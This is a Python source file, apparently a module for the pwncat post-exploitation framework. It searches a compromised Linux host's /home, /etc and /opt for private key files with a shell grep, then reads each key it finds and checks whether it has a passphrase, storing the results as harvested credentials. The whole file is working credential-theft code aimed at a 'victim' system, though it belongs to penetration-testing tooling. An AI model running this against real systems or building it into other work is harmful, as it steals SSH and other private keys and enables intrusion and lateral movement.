#!/usr/bin/env python3
from Crypto.PublicKey import RSA
import time

import rich.markup

import pwncat
from pwncat.platform.linux import Linux
from pwncat.modules import Status
from pwncat.modules.agnostic.enumerate import EnumerateModule, Schedule
from pwncat.modules.linux.enumerate.creds import PrivateKeyData


class Module(EnumerateModule):
    """
    Search the victim file system for configuration files which may
    contain private keys. This uses a regular expression based search
    to find files whose contents look like a SSH private key.
    """

    PROVIDES = ["creds.private_key"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.PER_USER

    def enumerate(self, session: "pwncat.manager.Session"):

        # This uses a list because it does multiple things
        # 1. It _finds_ the private key locations
        # 2. It tries to _read_ the private keys
        # This needs to happen in two loops because it has to happen one at
        # at a time (you can't have two processes running at the same time)
        # ..... (right now ;)
        facts = []

        # Search for private keys in common locations
        proc = session.platform.Popen(
            "grep -l -I -D skip -rE '^-+BEGIN .* PRIVATE KEY-+$' /home /etc /opt 2>/dev/null | xargs stat -c '%u %n' 2>/dev/null",
            shell=True,
            text=True,
            stdout=pwncat.subprocess.PIPE,
        )

        with proc.stdout as pipe:
            yield Status("searching for private keys")
            for line in pipe:
                line = line.strip().split(" ")
                uid, path = int(line[0]), " ".join(line[1:])
                yield Status(f"found [cyan]{rich.markup.escape(path)}[/cyan]")
                facts.append(PrivateKeyData(self.name, path, uid, None, False))

        for fact in facts:
            try:
                yield Status(f"reading [cyan]{rich.markup.escape(fact.path)}[/cyan]")
                with session.platform.open(fact.path, "r") as filp:
                    fact.content = filp.read().strip().replace("\r\n", "\n")

                try:
                    # Try to import the key to test if it's valid and if there's
                    # a passphrase on the key. An "incorrect checksum" ValueError
                    # is raised if there's a key. Not sure what other errors may
                    # be raised, to be honest...
                    RSA.importKey(fact.content)
                except ValueError as exc:
                    if "incorrect checksum" in str(exc).lower():
                        # There's a passphrase on this key
                        fact.encrypted = True
                    else:
                        # Some other error happened, probably not a key
                        continue

                yield fact
            except (PermissionError, FileNotFoundError):
                continue
